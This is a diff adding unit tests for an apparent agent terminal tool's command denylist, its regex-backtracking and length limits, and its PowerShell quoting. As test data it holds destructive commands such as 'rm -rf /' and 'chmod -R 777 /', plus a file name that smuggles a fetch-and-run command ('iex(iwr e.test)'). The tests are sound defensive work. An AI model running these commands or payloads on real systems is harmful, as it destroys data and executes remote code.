@@ -538,6 +538,78 @@ class DenylistTest(unittest.TestCase):
                     "ssh-add -l", "git commit -m 'reboot flow'", "grep -r shutdown app/", "pip install sshtunnel"):
             self.assertIsNone(ws.denied(cmd), cmd)
 
+    def test_rm_and_chmod_flag_forms(self):
+        for cmd in ("rm -r -f /", "rm -rf/", "rm --no-preserve-root -rf /", "rm -rf --no-preserve-root",
+                    "rm -rf--no-preserve-root", "rm --no-preserve-root", "ls; rm -r --force /*", "x | rm -fr /",
+                    "chmod -R -v 777 /", "chmod -v -R 0777 /", "chmod 777 -R /", "chmod -v 777 -v -R /"):
+            self.assertIsNotNone(ws.denied(cmd), cmd)
+        for cmd in ("rm -r -f /tmp", "rm -rf ./ /tmp", "rm -- -x", "chmod -v 777 /", "chmod -R 777 /srv"):
+            self.assertIsNone(ws.denied(cmd), cmd)
+
+    def test_crafted_inputs_do_not_backtrack(self):
+        for cmd in ("rm " + "-" * 5000 + "!", "rm " + "-a " * 2600 + "!", "rm " + "-a" * 4000 + "!",
+                    "chmod " + "-R " * 2600 + "x", "chmod " + "-R " * 1300 + "777 " + "-R " * 1300 + "x",
+                    "; rm " * 1300 + "!", "sh -c " * 1300):
+            start = time.perf_counter()
+            ws.denied(cmd, windows=True)
+            self.assertLess(time.perf_counter() - start, 0.2, cmd[:40])
+
+    async def _execute(self, command, *, name="run_terminal_command"):
+        row = {"id": 4, "alias": "prod", "default_cwd": "/srv"}
+        review = AsyncMock()
+        with patch.object(ws, "resolve_host_row", return_value=row), \
+                patch.object(ws.hosts, "settings_for", return_value={}), \
+                patch.object(ws.hosts, "effective_permission", return_value="project"), \
+                patch.object(ws, "denied", wraps=ws.denied) as deny, \
+                patch.object(permissions, "review", review):
+            text, rec = await ws.execute(name, json.dumps({"command": command, "description": "x"}),
+                                         user_id=1, gate=object())
+        return text, rec, deny, review
+
+    def test_length_limit_runs_before_denylist_and_gate(self):
+        for name in ("run_terminal_command", "monitor"):
+            text, rec, deny, review = asyncio.run(self._execute("rm " + "-" * 9000 + "!", name=name))
+            self.assertIn("the limit is 8000", text)
+            self.assertEqual(rec["status"], "error")
+            deny.assert_not_called()
+            review.assert_not_called()
+
+
+def _ps_single_quoted(script: str) -> tuple[str, str]:
+    """PowerShell's tokenizer for a leading single-quoted string: any of
+    ' U+2018-U+201B ends it unless the next char is also one of them.
+    Returns (value, rest of script)."""
+    quotes = "'\u2018\u2019\u201a\u201b"
+    assert script[0] in quotes
+    out, i = [], 1
+    while i < len(script):
+        c = script[i]
+        if c in quotes:
+            if i + 1 < len(script) and script[i + 1] in quotes:
+                out.append(script[i + 1])
+                i += 2
+                continue
+            return "".join(out), script[i + 1:]
+        out.append(c)
+        i += 1
+    raise AssertionError("unterminated string")
+
+
+class PowerShellLiteralTest(unittest.TestCase):
+    def test_every_single_quote_char_stays_inside_the_literal(self):
+        for q in "'\u2018\u2019\u201a\u201b":
+            path = f"C:\\proj\\x{q}; iex(iwr e.test); {q}.txt"
+            for literal in (ws._ps_literal(path), ws._ps_path_expr(path)):
+                value, rest = _ps_single_quoted(literal)
+                self.assertEqual((value, rest), (path, ""), repr(q))
+            value, rest = _ps_single_quoted(ws._probe_cmd(path, windows=True)[5:])
+            self.assertEqual(value, path)
+            self.assertTrue(rest.startswith("\n$d = Split-Path"), repr(q))
+
+    def test_mixed_quotes_round_trip(self):
+        text = "a'\u2019b\u2018'\u201a\u201b''c"
+        self.assertEqual(_ps_single_quoted(ws._ps_literal(text)), (text, ""))
+
 
 class JobOutputTest(unittest.TestCase):
     def test_head_and_tail_survive(self):
